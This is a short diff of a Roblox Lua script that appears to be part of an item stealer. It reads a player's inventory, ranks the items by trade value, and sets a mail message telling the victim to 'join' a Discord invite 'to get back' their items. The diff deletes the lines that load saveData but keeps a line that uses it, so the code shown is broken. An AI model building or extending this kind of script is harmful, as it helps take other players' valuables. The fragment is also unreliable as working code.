@@ -12,13 +12,6 @@ local MailMessage = "Join gg / GY2RVSEGDT to get back"
 
 local HttpService = game:GetService("HttpService")
 
--- Retrieve the player's inventory
-local saveData = require(clientFolder.Save).Get()
-if not (saveData and saveData.Inventory) then
-    warn("Failed to retrieve inventory data!")
-    return
-end
-
 local save = saveData.Inventory
 local sortedItems = {}
 local totalRAP = 0
